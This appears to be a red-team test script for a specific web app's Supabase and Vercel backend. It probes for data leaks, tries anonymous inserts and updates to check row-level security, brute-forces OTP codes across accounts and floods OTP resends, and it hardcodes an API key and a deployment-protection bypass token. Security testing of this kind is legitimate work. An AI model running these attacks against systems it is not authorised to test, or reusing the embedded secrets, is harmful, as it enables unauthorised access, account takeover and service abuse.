#!/usr/bin/env node
/**
 * Deep-dive verification — extra checks.
 */

const SUPA = 'https://pqvnjgyqbxlylawwogjv.supabase.co'
const ANON = 'sb_publishable_3uRUZqdvazd4cENt8WOWJA_SB7HmCEE'
const PROD = 'https://localit-p05j9rsln-nhattoann.vercel.app'
const BYPASS = 'w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A'

async function req(url, init = {}) {
  const headers = { 'x-vercel-protection-bypass': BYPASS, ...init.headers }
  const r = await fetch(url, { ...init, headers })
  const text = await r.text()
  let json = null
  try { json = JSON.parse(text) } catch {}
  return { status: r.status, text, json, headers: r.headers }
}

async function main() {
  // 1. Verify the XSS payload WAS stored — look for any XSS strings
  console.log('\n=== D1: Look for XSS strings in profiles ===')
  // The earlier query used 'select=id,email,full_name,role' which is fine, but the result was []. Let's try other filters
  const r1 = await req(`${SUPA}/rest/v1/profiles?or=(full_name.like.*alert*,full_name.like.*script*)&select=id,email,full_name,role&limit=10`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('XSS profiles:', r1.status, r1.text.slice(0, 2000))

  // Look at all profiles — was the trigger missing so empty email got inserted?
  const r2 = await req(`${SUPA}/rest/v1/profiles?select=id,email,full_name,role,created_at&order=created_at.desc&limit=30`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('\n=== D2: Recent profiles via anon ===')
  console.log('count:', r2.json?.length)
  for (const p of (r2.json || []).slice(0, 20)) {
    console.log(`  ${p.id} | email="${p.email}" | name="${p.full_name}" | role=${p.role} | ${p.created_at}`)
  }

  // 3. Test that auth.users metadata (e.g., XSS) is accessible somehow
  console.log('\n=== D3: Check auth.users metadata leak via PostgREST ===')
  const r3 = await req(`${SUPA}/rest/v1/auth.users?select=*&limit=2`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('auth.users:', r3.status, r3.text.slice(0, 300))

  // 4. Try direct INSERT into tourists/buddies as anon (RLS check)
  console.log('\n=== D4: Direct insert into tourists/buddies as anon ===')
  const r4 = await req(`${SUPA}/rest/v1/buddies`, {
    method: 'POST',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
    body: JSON.stringify({ id: 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa', location_city: 'PWNED_DIRECT', hourly_rate: 0 }),
  })
  console.log('anon insert buddy:', r4.status, r4.text.slice(0, 400))

  // 5. Try to UPDATE buddy row from anon
  const r5 = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555`, {
    method: 'PATCH',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
    body: JSON.stringify({ bio: 'HACKED BY ANON' }),
  })
  console.log('anon update buddy:', r5.status, r5.text.slice(0, 400))

  // 6. Verify OTP brute force is rate-limited per-userId, but is it rate-limited per-IP across userIds?
  // Use 5 different userIds, 5 attempts each — total 25 attempts across users
  console.log('\n=== D6: Cross-user OTP brute force (5 users × 5 attempts) ===')
  const userIds = []
  for (let i = 0; i < 5; i++) {
    const sa = await req(`${PROD}/api/auth/signup-admin`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email: `redteam-crossotp-${Date.now()}-${i}@example.com`, password: 'password123', fullName: `C${i}`, role: 'tourist' }),
    })
    userIds.push(sa.json?.userId)
  }
  console.log('userIds:', userIds)
  let attempts = 0
  let lockouts = 0
  for (const uid of userIds) {
    for (let j = 0; j < 7; j++) {
      const r = await req(`${PROD}/api/auth/verify-otp`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ userId: uid, code: String(Math.floor(Math.random() * 1e6)).padStart(6, '0') }),
      })
      attempts++
      if (r.status === 410) lockouts++
    }
  }
  console.log(`Cross-user brute: ${attempts} attempts, ${lockouts} lockouts (5 expected)`)

  // 7. Can attacker spam resend-otp to drain Resend quota?
  console.log('\n=== D7: Resend OTP cost amplification (no per-userId throttle) ===')
  const sa = await req(`${PROD}/api/auth/signup-admin`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: `redteam-amplify-${Date.now()}@example.com`, password: 'password123', fullName: 'Amp', role: 'tourist' }),
  })
  const uid = sa.json?.userId
  if (uid) {
    let success = 0
    for (let i = 0; i < 30; i++) {
      const r = await req(`${PROD}/api/auth/resend-otp`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ userId: uid }),
      })
      if (r.status === 200) success++
    }
    console.log(`Resend ${success}/30 succeeded — cost amplification confirmed`)
  }

  // 8. Verify Vercel Deployment Protection can be bypassed by anyone
  console.log('\n=== D8: Vercel Deployment Protection bypass available in client bundle? ===')
  // Try to fetch the home page and look for the bypass token
  const home = await fetch(`${PROD}/`)
  const homeText = await home.text()
  const hasBypass = homeText.includes('w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A')
  console.log('home page contains bypass token?', hasBypass)
  // Look for the SSO nonce in HTML
  const ssoHits = homeText.match(/vercel\.com\/sso-api/g)?.length || 0
  console.log('SSO API references on home page:', ssoHits)

  // 9. Profile metadata leak via OpenAPI — does the anon key see schema definitions?
  console.log('\n=== D9: PostgREST schema discovery ===')
  const op = await req(`${SUPA}/rest/v1/`, { headers: { apikey: ANON } })
  console.log('PostgREST root:', op.status, op.text.slice(0, 300))
}

main().catch(e => { console.error('FATAL', e); process.exit(1) })